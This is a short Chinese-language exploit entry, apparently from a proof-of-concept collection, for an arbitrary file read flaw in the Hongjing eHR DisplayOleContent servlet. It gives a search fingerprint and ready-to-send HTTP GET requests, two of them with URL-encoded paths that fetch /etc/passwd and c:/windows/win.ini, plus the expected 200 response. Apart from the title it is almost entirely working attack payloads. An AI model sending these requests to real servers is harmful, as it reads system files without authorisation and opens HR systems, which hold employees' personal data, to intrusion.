# 宏景eHRDisplayOleContent任意文件读取

- **系统**：宏景eHRDisplayOleContent　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`body="<div class=\"`
- **请求**：`GET /w_selfservice/servlet/DisplayOleContent?filePath=E~34djIXwDQj~39QpNQPAATTP~32HJFPAATTP~32ElEAPAATTP~32HJFPAATTPmROFMKr~31aR~32wOiMLQUvdsPAATTP~33HJDPAATTP&bencrypt=true HTTP/1.1`

**请求体 / payload**
```
GET /servlet/DisplayOleContent?filePath=E~34djIXwDQj~39QpNQPAATTP~32HJFPAATTP~32ElEAPAATTP~32HJFPAATTPmROFMKr~31aR~32wOiMLQUvdsPAATTP~33HJDPAATTP&bencrypt=true HTTP/1.1
Host:
GET /w_selfservice/servlet/DisplayOleContent?filePath=%60%65%74%63%60%70%61%73%73%77%64&bencrypt=0 HTTP/1.1
Host:
GET /w_selfservice/servlet/DisplayOleContent?filePath=%63%3a%60%77%69%6e%64%6f%77%73%60%77%69%6e%2e%69%6e%69&bencrypt=0 HTTP/1.1
Host:
```
- **预期**：200　|　—